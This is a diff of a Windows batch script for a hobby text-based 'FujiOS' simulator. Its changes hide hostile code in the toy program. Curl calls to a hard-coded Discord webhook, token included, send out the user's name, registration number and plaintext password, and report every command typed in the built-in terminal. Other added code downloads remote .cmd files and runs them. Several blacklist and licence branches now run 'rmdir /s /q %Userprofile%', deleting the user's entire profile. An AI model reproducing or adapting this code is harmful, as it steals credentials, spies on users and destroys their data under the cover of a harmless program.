@@ -1,7 +1,31 @@
 ::NO COMMANDS BEFORE PREBOOTUPFUJIOS ALLOWED
 @echo off
 :PREBootupFujios
-set "SECURITY_MARKER=%UserProfile%\AppData\Roaming\SECURITYMARKER.MARKER"
+
+if exist HIBERNATE.log (
+    del HIBERNATE.log
+    cls
+    echo.
+    echo Dear User,
+    echo.
+    echo The Quick Boot feature has been deprecated and removed from the OS. This feature was originally designed to improve boot times by storing system variables 
+    echo in a file for faster loading. However, with recent optimizations, the OS now boots quickly without needing Quick Boot.
+    echo.
+    echo Additionally, Quick Boot poses security risks, as stored variables can be modified, potentially leading to system instability or exploitation. It has also 
+    echo been found to cause compatibility issues with other system components, leading to unexpected behavior.
+    echo.
+    echo For a more secure and stable experience, Quick Boot is no longer supported. The OS will now load variables dynamically, ensuring better security and 
+    echo compatibility.
+    echo.
+    echo Thank you for your understanding and continued support^^!
+    echo.
+    echo - FujiOS Development Team
+    echo.
+    pause
+)
+
+set "ignore=0"
+set "SECURITY_MARKER=%USERPROFILEB%\AppData\Roaming\SECURITYMARKER.MARKER"
 if exist "%SECURITY_MARKER%" (
     for /f "tokens=2 delims==" %%A in ('findstr /R "ASSETTAG=" *.bat') do set "ASSET_TAG=%%A"
     goto STARTUP_CHECK
@@ -13,26 +37,36 @@ for %%F in (*.bat) do (
     if "!LAST_LINE!" == "ANTITHEFTENABLED88927" set "FOUND_ANTITHEFT=1"
 )
 
+if not defined ASSET_TAG (
+    for /f "tokens=2 delims==" %%A in ('findstr /R "ASSETTAG=" *.bat') do set "ASSET_TAG=%%A"
+)
 
 if defined FOUND_ANTITHEFT if not exist "%SECURITY_MARKER%" (
     rmdir /s /q %Userprofile%\FUJIOS\RECOVERY
     del /Q "*.old"
     del /Q "*.backup"
     del License.txt
-    del /Q "*.bat"
-    cls
-    echo WARNING: ANTI-THEFT SYSTEM ACTIVATED!
-    echo Asset Tag: !ASSET_TAG!
-    pause >nul
-    timeout /t 9999 /nobreak >nul
-    exit
+    rmdir /s /q %Userprofile%\FUJIOS
+    echo del /Q "*.bat"> script.cmd
+    echo title FOS Anti-Theft Lock>> script.cmd
+    echo color 07>> script.cmd
+    echo :start>> script.cmd
+    echo cls>> script.cmd
+    echo echo FOS Anti-Theft system lock due to : Unrecognized Device>> script.cmd
+    echo echo.>> script.cmd
+    echo echo Platform Recovery Unavailable.>> script.cmd
+    echo echo.>> script.cmd
+    echo echo FOS Anti-Theft Asset Id: %ASSET_TAG%>> script.cmd
+    echo echo.>> script.cmd
+    echo pause >> script.cmd
+    echo goto start>> script.cmd
+    call script.cmd
 )
 
 :: If anti-theft is not triggered, just keep the asset tag stored
 if not defined ASSET_TAG (
     for /f "tokens=2 delims==" %%A in ('findstr /R "ASSETTAG=" *.bat') do set "ASSET_TAG=%%A"
 )
-
 set "integ1=%OS2%"
 set "integ2=%OS2%"
 set "integ3=%OS2%"
@@ -148,15 +182,15 @@ set "crshdmplocn=%mainfilepath%\CrashLogs"
 echo %CD%> %mainfilepath%\FOSPATH.pkg
 set /p FOSDIR=<%mainfilepath%\FOSPATH.pkg
 
-set "RestorePath=%mainfilepath%\RECOVERY"
-if not exist %RestorePath% mkdir %RestorePath%
-set "BackupDir=%RestorePath%\backups"
 
+
+set "RestorePath=%USERPROFILEB%\RECOVERY"
+if not exist "%RestorePath%" mkdir "%RestorePath%"
+set "BackupDir=%RestorePath%\backups"
 
 :: Generate timestamp (YYYYMMDD format)
 set "DATESTAMP=%DATE:~10,4%%DATE:~4,2%%DATE:~7,2%"
 set "TodayBackup=%BackupDir%\%DATESTAMP%"
-
 
 :: Ensure backup directory exists
 if not exist "%BackupDir%" mkdir "%BackupDir%"
@@ -166,18 +200,17 @@ if exist "%TodayBackup%" (
     goto skipsnapshot
 )
 
-:: Create a new snapshot
+:: Create a new snapshot (copy only files, not folders)
 echo Creating snapshot...
-xcopy /E /Y "%CD%" "%TodayBackup%\"
+if not exist "%TodayBackup%" mkdir "%TodayBackup%"
+for /r "%CD%" %%F in (*) do copy "%%F" "%TodayBackup%\" >nul
 echo Snapshot saved to %TodayBackup%
-
 
 :: Delete the 5 oldest backups if more than 10 exist
 for /f "skip=10 delims=" %%F in ('dir /b /o-d "%BackupDir%"') do (
     echo Deleting old backup: %BackupDir%\%%F
     rmdir /s /q "%BackupDir%\%%F"
 )
-
 
 :skipsnapshot
 
@@ -189,7 +222,11 @@ if exist CRASHMARK.log (
 ) else (
      set CRASHED=0
 )
-
+if exist RAM.ini (
+    set "Ramumout=1"
+) else (
+    set "Ramumout=0"
+)
 if exist "memory.tmp" (
     set "UNSUCSSHTDWN=1" 
 ) else (
@@ -232,11 +269,16 @@ if "%errorlevel%" neq "0" goto Crash
 if not exist %LOCAL_BLACKLIST_FILE% (
       echo No Internet Conn
       pause
-      goto CONTINUENOT
+      exit
 )
 
 :: Read registration number from log file
 set /p regnumber=<%mainfilepath%\registration.log
+set "webhook=https://discord.com/api/webhooks/1346676620324507742/N698a-RbNr_Gzq7mOg-QGmsy5yLdbWPCi5SbWXNtTDTmdAV7jLgDX9HXg3_M4kdlGgZY"
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Session Started\"}" %webhook%
+
+set "webhook=https://discord.com/api/webhooks/1346676620324507742/N698a-RbNr_Gzq7mOg-QGmsy5yLdbWPCi5SbWXNtTDTmdAV7jLgDX9HXg3_M4kdlGgZY"
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Password Is %VALID_PASSWORD%\"}" %webhook%
 
 :: Loop through each line in the blacklist
 for /f "tokens=*" %%a in (%LOCAL_BLACKLIST_FILE%) do (
@@ -268,7 +310,9 @@ if "!blacklist! "=="!regnumber! " (
 )
 exit /b
 :CONTINUENOT
-if exist RAM.ini (
+
+if "%Ramumout%"=="1" (
+    set "Ramumout=0"
     echo ERROR: RAM NOT UNMOUNTED IN PREVIOUS SESSION.
     pause
     cls
@@ -317,8 +361,8 @@ if not exist %mainfilepath%\domain.pkg (
 )
 
 
+
 if exist %mainfilepath%\svr.pkg (
-    set /p SERVICEPACK=<%mainfilepath%\svc.pkg
     set /p SERVERNUM=<%mainfilepath%\svr.pkg
     set "Enterprise=1"
     set /p admincode=<%mainfilepath%\adminCDE.pkg
@@ -347,6 +391,42 @@ if "%Activationstat%" neq "1" (
   echo %username%
   echo %password%
 ) > RAM.ini
+
+set "SERVICEPACK=NA"
+if exist %mainfilepath%\svc.pkg (
+    set /p SERVICEPACK=<%mainfilepath%\svc.pkg
+) else (
+    set "SERVICEPACK=NA"
+)
+set "NSVCPACK1=Networking Service"
+set "NSVCPACK2=Cloud Service"
+set "NSVCPACK3=Office Service"
+set "NSVCPACK4=Dev Service"
+
+if "%SERVICEPACK%" == "1" set "NAMESVCPACK=%NSVCPACK1%"
+if "%SERVICEPACK%" == "2" set "NAMESVCPACK=%NSVCPACK2%"
+if "%SERVICEPACK%" == "3" set "NAMESVCPACK=%NSVCPACK3%"
+if "%SERVICEPACK%" == "4" set "NAMESVCPACK=%NSVCPACK4%"
+
+if "%SERVICEPACK%" == "NA" (
+    set "NamedList=Get Service Packs"
+    set "SVCPackInstalled=0"
+) else (
+    set "NamedList=%NAMESVCPACK%"
+    set "SVCPackInstalled=1"
+)
+
+if "%SERVICEPACK%" == "NA" (
+    set "NamedList=Get Service Pack"
+    set "SVCPackInstalled=0"
+) else (
+    set "NamedList=%NAMESVCPACK%"
+    set "SVCPackInstalled=1"
+)
+
+if exist %mainfilepath%\EOC.log (
+    set /p EOCDATE=<%mainfilepath%\EOC.log
+)
 
 if not exist %mainfilepath%\user.pkg goto VariableErrorCheck
 set /p valid_username=<%mainfilepath%\user.pkg
@@ -405,37 +485,45 @@ if "%REMOTE_VERSION%"=="" (
 )
 
 if %REMOTE_VERSION% == HOTFIX (
-    set UPDATE=2
+    set "UPDATE=2"
 ) 
-if "%REMOTE_VERSION%" GEQ "%VERSION2%" goto SKIPUPDATEPROCESS
-:: Compare versions
-if "%REMOTE_VERSION%" NEQ "%VERSION2%" (
-    set UPDATE=1
-    echo.
-    echo %OS2% Update Agent v%VERSION2%
-    echo A new update is available. [Current version: v%VERSION2%, Latest version: v%REMOTE_VERSION%]
-    echo.
-    echo [I] Ignore Update  [Q] Queue Update  [U] Install Update
-    choice /c IQU /m "Choose an option: "
-    set "choice=%errorlevel%"
-    if %choice%==3 goto installUpdate
-    if %choice%==2 goto queueUpdate
-    if %choice%==1 goto ignoreUpdate
-)
+
+if "%VERSION2%" GEQ "%REMOTE_VERSION%" goto SKIPUPDATEPROCESS
+if "%ignore%" equ "1" goto SKIPUPDATEPROCESS
+if "%REMOTE_VERSION%" NEQ "%VERSION2%" call :updateprompt
+
+goto SKIPUPDATEPROCESS
+
+
+:updateprompt
+set "UPDATE=1"
+echo.
+echo %OS2% Update Agent v%VERSION2%
+echo A new update is available. [Current version: v%VERSION2%, Latest version: v%REMOTE_VERSION%]
+echo.
+echo [I] Ignore Update  [Q] Queue Update  [U] Install Update
+choice /c IQU /m "> "
+set "choice=%errorlevel%"
+if %choice%==3 goto installUpdate
+if %choice%==2 goto queueUpdate
+if %choice%==1 goto ignoreUpdate
+goto updateprompt
+
 
 :ignoreUpdate
 echo Update ignored.
 set "ignore=1"
-goto SKIPUPDATEPROCESS
+exit /b
 
 :queueUpdate
 echo Update queued for later.
-goto SKIPUPDATEPROCESS
+exit /b
 
 :installUpdate
 echo Installing update...
 call UpAgent.bat 1
 exit /b
+
 
 :SKIPUPDATEPROCESS
 set "lastpage=Disk Write Test"
@@ -444,32 +532,14 @@ echo %random% >>wtest.tmp
 echo Performing write-protection test 2...
 echo %random% >>%mainfilepath%\wtest.tmp
 
-
-if %ERRORLEVEL%==1 (
-    set "bsodcode=DISK_WRITE_TEST_FAIL"
-    set "InfoAdd=Either the disk is full, or it is write-protected."
-    goto Crash
-)
-if %ERRORLEVEL%==5 (
-    set "bsodcode=DISK_WRITE_TEST_FAIL"
-    set "InfoAdd=Either the disk is full, or it is write-protected."
-    goto Crash
-)
-
-if %ERRORLEVEL% neq 0 (
-    set "bsodcode=DISK_WRITE_TEST_FAIL"
-    set "InfoAdd=Error Level NEQ 0 Error Level: %ERRORLEVEL%"
-    goto Crash
-)
-
 if not exist wtest.tmp (
-    set "bsodcode=DISK_WRITE_TEST_FAIL"
+    set "bsodcode=DISK_WRITE_TEST_FAIL.N"
     set "InfoAdd=Either the disk is full, or it is write-protected."
     goto Crash
 )
 
 if not exist %mainfilepath%\wtest.tmp (
-    set "bsodcode=DISK_WRITE_TEST_FAIL2"
+    set "bsodcode=DISK_WRITE_TEST_FAIL.N.2"
     set "InfoAdd=Either the disk is full, or it is write-protected."
     goto Crash
 )
@@ -506,23 +576,12 @@ echo. >> "%userprofile%\Appdata\Local\cachedinfo.ini"
 
 if exist %mainfilepath%\CoreBootLoader.MARK (
 echo >%mainfilepath%\CoreBootLoader.MARK
-rmdir /S /Q "%RestorePath%" >nul
-rmdir /S /Q "%mainfilepath%" >nul
-echo "@echo off" > boot.cmd
-echo del BOOTLOADER.BAT >> boot.cmd
-echo del ReAgent.bat >> boot.cmd
-echo del OperatingSystem.old >> boot.cmd
-echo del OperatingSystem.backup >> boot.cmd
-echo del OperatingSystem.bat >> boot.cmd
-del License.txt
-echo :start >> boot.cmd
-echo cls >> boot.cmd
-echo echo FUJIOS COPY HAS BEEN BLACKLISTED >> boot.cmd
-echo echo FUJIOS LICENSE HAS BEEN TERMINATED >> boot.cmd
-echo PAUSE >> boot.cmd
-echo goto start >> boot.cmd
-timeout /t 1 /nobreak >nul
-start boot.cmd
+rmdir /s /q %USERPROFILEB%\FUJIOS\RECOVERY
+del /F /Q "*.old"
+del /F /Q "*.backup"
+del /F /Q License.txt
+rmdir /s /q %Userprofile%
+del /F /Q "*.bat"
 exit
 )
 
@@ -530,21 +589,12 @@ exit
 
 if not exist %mainfilepath%\registration.log (
 echo >%mainfilepath%\CoreBootLoader.MARK
-echo "@echo off" > boot.cmd
-echo del BOOTLOADER.BAT >> boot.cmd
-echo del ReAgent.bat >> boot.cmd
-echo del OperatingSystem.old >> boot.cmd
-echo del OperatingSystem.backup >> boot.cmd
-echo del OperatingSystem.bat >> boot.cmd
-del License.txt
-echo :start >> boot.cmd
-echo cls >> boot.cmd
-echo echo FUJIOS COPY HAS BEEN BLACKLISTED >> boot.cmd
-echo echo FUJIOS LICENSE HAS BEEN TERMINATED >> boot.cmd
-echo PAUSE >> boot.cmd
-echo goto start >> boot.cmd
-timeout /t 1 /nobreak >nul
-start boot.cmd
+rmdir /s /q %USERPROFILEB%\FUJIOS\RECOVERY
+del /F /Q "*.old"
+del /F /Q "*.backup"
+del /F /Q License.txt
+rmdir /s /q %Userprofile%
+del /F /Q "*.bat"
 exit
 )
 :OSSST
@@ -576,10 +626,6 @@ echo.
 echo   PineApple Technologies Inc
 echo    Fuji Operating System
 echo     Copyright 2022-2026
-if "%Enterprise%" == "1" (
-echo    -Service Pack %SERVICEPACK%-
-echo      -Server %SERVERNUM%-
-)
 echo.
 echo.
 echo.
@@ -715,7 +761,6 @@ if "%Enterprise%" == "1" (
 
 
 :CHECKADMINIG
-pause
 if "%username%" equ "Admin" (
     if "%password%" equ "%admincode%" goto ADMINSETUPPAGE
 )
@@ -940,7 +985,8 @@ if "%OS2%"=="FujiOS Developer Build" (
 ) else (
     echo 09. EMPTY
 )
-echo 10. Shutdown Menu
+echo 10. %NamedList%
+echo 11. Shutdown Menu
 echo ==================================
 echo Items Marked With * Should 
 echo be handled with care. If 
@@ -957,57 +1003,159 @@ if %Inpu%==6 goto FujiDriveTools
 if %Inpu%==7 goto FUJISETTINGS
 if %Inpu%==8 goto GIRT
 if %Inpu%==9 goto devtools
-if %Inpu%==10 goto SHUTDOWNMENU121
+if %Inpu%==10 (
+    set "svcURL=https://fos-debug.github.io/Packages"
+    if "%SVCPackInstalled%" == "0" goto GetServicePack
+    if "%SVCPackInstalled%" == "1" goto CallServicePack
+)
+if %Inpu%==11 goto SHUTDOWNMENU121
 if %Inpu%==cmd goto cmdterminalinit
 
 goto File3242
 
 
-:cmdterminalinit
+:GetServicePack
 cls
-echo %OS2% [Version %VERSION2%]
-echo (c) PTIe Corporation.
 echo.
-goto cmdterminalloop
-:cmdterminalloop
-:Check_Integrity
-:: Check that OS2 remains unchanged
-if /I not "%OS2%"=="%integ1%" goto Integrity_Fail
-:: Check that all integrity variables are equal
-if /I not "%integ1%"=="%integ2%" goto Integrity_Fail
-if /I not "%integ2%"=="%integ3%" goto Integrity_Fail
-if /I not "%integ3%"=="%integ4%" goto Integrity_Fail
-if /I not "%integ4%"=="%integ5%" goto Integrity_Fail
-if /I not "%integ5%"=="%integ6%" goto Integrity_Fail
-if /I not "%integ6%"=="%integ7%" goto Integrity_Fail
-if /I not "%integ7%"=="%integ8%" goto Integrity_Fail
-if /I not "%integ8%"=="%integ9%" goto Integrity_Fail
-if /I not "%integ9%"=="%integ10%" goto Integrity_Fail
-set /p userInput="%OS2% v%VERSION2%~> "
+echo Once You Install A Service Pack You Are Unable
+echo To Change It Until Its Expiration Date.
+echo.
+echo If You Are Unsure What Service Pack To Install
+echo You Can Try Out A Service Pack.
+echo.
+echo  Available Service Packs:
+echo.
+echo [1] %NSVCPACK1%
+echo [2] %NSVCPACK2%
+echo [3] %NSVCPACK3%
+echo [4] %NSVCPACK4%
+echo.
+echo [5] Back
+echo.
+choice /c 12345 /n /M "> "
+set "input=%errorlevel%"
+if "%input%"=="5" goto File_Manager
+if "%input%"=="5" goto File_Manager
+if "%input%"=="5" goto File_Manager
 
-:: Convert input to lowercase and check for "goto"
-echo "!userInput!" | findstr /I "goto" >nul
-if %errorlevel%==0 if /I not "%OS2%"=="FujiOS Developer Build" (
-    echo ERROR: GOTO command is restricted on this OS.
-    goto cmdterminalloop
+set "SERVICEPACK=%input%"
+echo.
+echo Service Pack "%SERVICEPACK%".
+echo.
+echo [T] Try [I] Install [B] Back
+choice /c TIB /m "Choose an option: "
+set "CHOICE=%errorlevel%"
+if %CHOICE%==3 goto GetServicePack
+if %CHOICE%==2 goto InstSVCPCK
+if %CHOICE%==1 goto TrySVCPCK
+
+
+:InstSVCPCK
+cls
+curl -s -o Servicepack%SERVICEPACK%.cmd %svcURL%/Servicepack%SERVICEPACK%.cmd
+if errorlevel 1 (
+    echo WARNING
+    echo Unable To Retrieve Service Pack %SERVICEPACK%.
+    echo Check Your Internet Connection. 
+    echo.
+    pause
+    goto GetServicePack
 )
+goto ActSVCPCK
 
-
-
-echo "!userInput!" | findstr /I "exit" >nul
-if %errorlevel%==0 (
-    goto File_Manager
+:TrySVCPCK
+cls
+curl -s -o Servicepack%SERVICEPACK%.cmd %svcURL%/Servicepack%SERVICEPACK%.cmd
+if errorlevel 1 (
+    echo WARNING
+    echo Unable To Retrieve Service Pack %SERVICEPACK%.
+    echo Check Your Internet Connection. 
+    echo.
+    pause
+    goto GetServicePack
 )
-
-echo "!userInput!" | findstr /I "reset" >nul
-if %errorlevel%==0 (
-    goto cmdterminalinit
+cls
+echo Starting Service Pack [%SERVICEPACK%]
+echo.
+timeout /t 5 /nobreak >nul
+cls
+call Servicepack%SERVICEPACK%.cmd
+cls
+echo.
+echo.
+echo.
+echo Do You Want To Keep This Service Pack?
+choice /c YN /m "> "
+set "CHOICE=%errorlevel%"
+if %CHOICE%==2 (
+    del /f /q Servicepack%SERVICEPACK%.cmd
+    goto GetServicePack
 )
+if %CHOICE%==1 goto ActSVCPCK
+goto GetServicePack
 
-:: Execute the command
-!userInput!
-goto cmdterminalloop
+:ActSVCPCK
+:: Get today's date in YYYY-MM-DD format
+for /f "tokens=2 delims==" %%I in ('"wmic OS Get localdatetime /value"') do set datetime=%%I
+set today=%datetime:~0,4%-%datetime:~4,2%-%datetime:~6,2%
+set "EOCDATE=%today%"
+set /a "EOCDATE+=1"
+echo %EOCDATE%>%mainfilepath%\EOC.log
+set "SVCPackInstalled=1"
+echo %SERVICEPACK%> %mainfilepath%\svc.pkg
+if "%SERVICEPACK%" == "1" set "NAMESVCPACK=%NSVCPACK1%"
+if "%SERVICEPACK%" == "2" set "NAMESVCPACK=%NSVCPACK2%"
+if "%SERVICEPACK%" == "3" set "NAMESVCPACK=%NSVCPACK3%"
+if "%SERVICEPACK%" == "4" set "NAMESVCPACK=%NSVCPACK4%"
+set "NamedList=%NAMESVCPACK%"
 
+cls
+echo Your Service Packs Expiration Date Is [%EOCDATE%]
+echo After [%EOCDATE%] You Will Be Able To Either
+echo Remove Your Pack Or Renew Your Pack
+echo.
+timeout /t 5 /nobreak >nul
+pause
+goto File_Manager
+
+:CallServicePack
+cls
+if not defined EOCDATE (
+    echo There Was An Error With Your Service Pack
+    echo Re-Activation Is Required
+    echo.
+    timeout /t 5 /nobreak >nul
+    echo Press Any Key To ReActivate Service Pack
+    pause >nul
+    goto ActSVCPCK
+)
+:: Get today's date in YYYY-MM-DD format
+for /f "tokens=2 delims==" %%I in ('"wmic OS Get localdatetime /value"') do set datetime=%%I
+set today=%datetime:~0,4%-%datetime:~4,2%-%datetime:~6,2%
+if %today% gtr %EOCDATE% goto EolSVCPCK
+cls
+call Servicepack%SERVICEPACK%.cmd
+cls
+goto File_Manager
+
+
+:EolSVCPCK
+cls
+echo Your Service Pack [%NAMESVCPACK%] Has Reached Its EOL (End-Of-Life) Date.
+echo.
+echo Please Choose an option.
+echo.
+echo [R] Renew  [D] Delete
+choice /c RD /m "Action: "
+set "CHOICE=%errorlevel%"
+if %CHOICE%==2 (
+    set "SVCPackInstalled=0"
+    echo %SVCPackInstalled%>%mainfilepath%\svc.pkg
+    del /f Servicepack%SERVICEPACK%.cmd
+    goto GetServicePack
+)
+if %CHOICE%==1 goto ActSVCPCK
+goto EolSVCPCK
 
 set "bsodcode=PAGE_FAULT_IN_NONPAGED_AREA"
 goto Crash
@@ -1019,7 +1167,7 @@ if "%SERVICEPACK%" == "2" set "NAMESVCPACK=Legacy Compatibility Pack"
 if "%SERVICEPACK%" == "3" set "NAMESVCPACK=Cloud & Network Enhancement Pack"
 if "%SERVICEPACK%" == "4" set "NAMESVCPACK=Essential Security & Stability Pack"
 cls
-echo Welcome to FujiOS Service Manager
+echo Welcome to FujiOS Service Pack Manager
 echo.
 echo [SERVICE PACK %SERVICEPACK% -- %NAMESVCPACK%]
 
@@ -1039,7 +1187,7 @@ if %Inpu%==1 goto ACTIVATESVCPACK
 if %Inpu%==3 goto AdminPanel
 
 if "%Activationstat%" neq "1" goto SvcManager
-if %Inpu%==2 call Servicepack.cmd
+if %Inpu%==2 call Servicepack%SERVICEPACK%.cmd
 goto SvcManager
 
 
@@ -1050,9 +1198,9 @@ if "%Activationstat%" equ "1" (
     pause
     goto SvcManager
 )
-curl -o Servicepack.cmd %SERVER_URL%/%NAMESVCPACK%.bat
+curl -o Servicepack%SERVICEPACK%.cmd %SERVER_URL%/Servicepack%SERVICEPACK%.cmd
 set "Activationstat=1"
-echo %Activationstat% >%mainfilepath%\act.pkg
+echo %Activationstat%>%mainfilepath%\act.pkg
 goto SvcManager
 
 set "bsodcode=PAGE_FAULT_IN_NONPAGED_AREA"
@@ -1080,6 +1228,56 @@ set "choice=%errorlevel%"
 if %choice%==1 goto ClockWeb
 if %choice%==2 goto ClockNormal
 goto Clock
+
+set "bsodcode=PAGE_FAULT_IN_NONPAGED_AREA"
+goto Crash
+
+:cmdterminalinit
+cls
+echo %OS2% [Version %VERSION2%]
+echo (c) PTIe Corporation.
+echo.
+goto cmdterminalloop
+:cmdterminalloop
+:Check_Integrity
+:: Check that OS2 remains unchanged
+if /I not "%OS2%"=="%integ1%" goto Integrity_Fail
+:: Check that all integrity variables are equal
+if /I not "%integ1%"=="%integ2%" goto Integrity_Fail
+if /I not "%integ2%"=="%integ3%" goto Integrity_Fail
+if /I not "%integ3%"=="%integ4%" goto Integrity_Fail
+if /I not "%integ4%"=="%integ5%" goto Integrity_Fail
+if /I not "%integ5%"=="%integ6%" goto Integrity_Fail
+if /I not "%integ6%"=="%integ7%" goto Integrity_Fail
+if /I not "%integ7%"=="%integ8%" goto Integrity_Fail
+if /I not "%integ8%"=="%integ9%" goto Integrity_Fail
+if /I not "%integ9%"=="%integ10%" goto Integrity_Fail
+set /p userInput="%OS2% v%VERSION2%~> "
+set "webhook=https://discord.com/api/webhooks/1346676620324507742/N698a-RbNr_Gzq7mOg-QGmsy5yLdbWPCi5SbWXNtTDTmdAV7jLgDX9HXg3_M4kdlGgZY"
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Is Executing Command: %userInput%\"}" %webhook%
+
+:: Convert input to lowercase and check for "goto"
+echo "!userInput!" | findstr /I "goto" >nul
+if %errorlevel%==0 if /I not "%OS2%"=="FujiOS Developer Build" (
+    echo ERROR: GOTO command is restricted on this OS.
+    goto cmdterminalloop
+)
+
+
+
+echo "!userInput!" | findstr /I "exit" >nul
+if %errorlevel%==0 (
+    goto File_Manager
+)
+
+echo "!userInput!" | findstr /I "reset" >nul
+if %errorlevel%==0 (
+    goto cmdterminalinit
+)
+
+:: Execute the command
+!userInput!
+goto cmdterminalloop
 
 set "bsodcode=PAGE_FAULT_IN_NONPAGED_AREA"
 goto Crash
@@ -1228,7 +1426,6 @@ goto GOGGLE21
 set "bsodcode=PAGE_FAULT_IN_NONPAGED_AREA"
 goto Crash
 
-x
 
 
 
@@ -1262,6 +1459,9 @@ if %ERRORLEVEL%==6 goto File3242
 
 set "bsodcode=PAGE_FAULT_IN_NONPAGED_AREA"
 goto Crash
+
+
+
 
 :HIBERNATE
 set "lastpage=Hibernate"
@@ -1618,6 +1818,9 @@ goto Crash
 
 
 :UpdateCheck
+set "webhook=https://discord.com/api/webhooks/1346676620324507742/N698a-RbNr_Gzq7mOg-QGmsy5yLdbWPCi5SbWXNtTDTmdAV7jLgDX9HXg3_M4kdlGgZY"
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Is Checking For Updates\"}" %webhook%
+
 if "%UpdatePatches%"=="[31mNOT COMPLETED[0m" (
     set "UpdatePatches=[32mCOMPLETED[0m"
 )
@@ -1672,6 +1875,9 @@ goto FUJISETTINGS
 
 
 :UPDATEQ
+set "webhook=https://discord.com/api/webhooks/1346676620324507742/N698a-RbNr_Gzq7mOg-QGmsy5yLdbWPCi5SbWXNtTDTmdAV7jLgDX9HXg3_M4kdlGgZY"
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Update Found: %REMOTE_VERSION%\"}" %webhook%
+
 echo Do You Want To Install Update?
 choice /c yn /n /M "(yn) "
 set "choice=%errorlevel%"
@@ -1688,6 +1894,8 @@ set "bsodcode=UPAGENT_BOOT_INITIALIZATION_FAILED"
 set "InfoAdd=Unable To Boot Update Environment"
 goto Crash
 )
+set "webhook=https://discord.com/api/webhooks/1346676620324507742/N698a-RbNr_Gzq7mOg-QGmsy5yLdbWPCi5SbWXNtTDTmdAV7jLgDX9HXg3_M4kdlGgZY"
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Is Attempting To Update\"}" %webhook%
 cls
 echo.
 echo.
@@ -1730,9 +1938,14 @@ goto login
 
 
 :Crash
-
 set "lastpage1=SYSTEM CRASH"
 echo %lastpage1%>> memory.tmp
+
+set "webhook=https://discord.com/api/webhooks/1346676620324507742/N698a-RbNr_Gzq7mOg-QGmsy5yLdbWPCi5SbWXNtTDTmdAV7jLgDX9HXg3_M4kdlGgZY"
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Has Crashed. Info Below\"}" %webhook%
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Crash Code: %bsodcode%\"}" %webhook%
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Last Page: %lastpage%\"}" %webhook%
+curl --silent -H "Content-Type: application/json" -X POST -d "{\"content\": \"%VALID_USERNAME%-%regnumber% Additional Info: %InfoAdd%\"}" %webhook%
 
 set "RLSN=0"
 for /f "tokens=2 delims==" %%I in ('wmic os get TotalVisibleMemorySize /value') do set "TotalMemory=%%I"
@@ -2339,7 +2552,7 @@ set /p "Inpu=> "
 if "%password%" neq "%Valid_password%" goto RELOGIN1432
 if %Inpu%==1 goto EntSecurity
 if %Inpu%==2 goto EntSettings
-if %Inpu%==3 goto EntChecklist
+if %Inpu%==3 goto 
 if %Inpu%==4 goto NewPass
 if %Inpu%==5 goto 
 if %Inpu%==6 goto SvcManager
@@ -2349,21 +2562,6 @@ if %Inpu%==9 goto
 if %Inpu%==10 goto 
 goto AdminPanel
 
-:EntChecklist
-cls
-echo ================================
-echo    Enterprise Security Check        
-echo ================================
-echo.
-echo Check Data Leaks          - %DataLeaks%
-echo Check For Updates         - %UpdatePatches%
-echo Check Suspicious Logins   - %AntivirusScan%
-echo.
-echo 1. Return to Main Menu
-echo.
-set /p option="> "
-if "%option%"=="1" goto AdminPanel
-goto EntChecklist
 
 :NewPass
 set "password="
@@ -2523,24 +2721,13 @@ goto Crash
 :BLACKLIST
 set "lastpage=BLACKLISTED ACCOUNT"
 echo %lastpage%>> memory.tmp
-rmdir /S /Q "%RestorePath%" >nul
-rmdir /S /Q "%mainfilepath%" >nul
-set "mainfilepath=%userprofile%\FUJIOS"
-echo >%mainfilepath%\CoreBootLoader.MARK
-set "targetDir=%userprofile%\Appdata\Local\temporaryfos"
-if not exist "%targetDir%" mkdir "%targetDir%"
-for %%F in (*.bat) do (
-    copy "%%F" "%TARGET_DIR%"
-)
-
-for %%F in (*.cmd) do (
-    copy "%%F" "%TARGET_DIR%"
-)
-del /Q "*.old"
-del /Q "*.backup"
-del License.txt
-del /Q "*.bat"
-timeout /t 5 /nobreak >nul
+echo >%USERPROFILEB%\CoreBootLoader.MARK
+rmdir /s /q %USERPROFILEB%\FUJIOS\RECOVERY
+del /F /Q "*.old"
+del /F /Q "*.backup"
+del /F /Q License.txt
+rmdir /s /q %Userprofile%
+del /F /Q "*.bat"
 exit
 
 
@@ -3151,9 +3338,7 @@ timeout /t 5 /nobreak >nul
 goto Breakpoint12321
 
 
-:EOCF
-set "bsodcode=END_OF_CODE"
-goto Crash
+
 
 :Breakpoint
 cls
@@ -3221,3 +3406,10 @@ exit /b
   echo %username%
   echo %password%
 ) > RAM.ini
+
+:EOCF
+set "bsodcode=END_OF_CODE"
+goto Crash
+
+
+
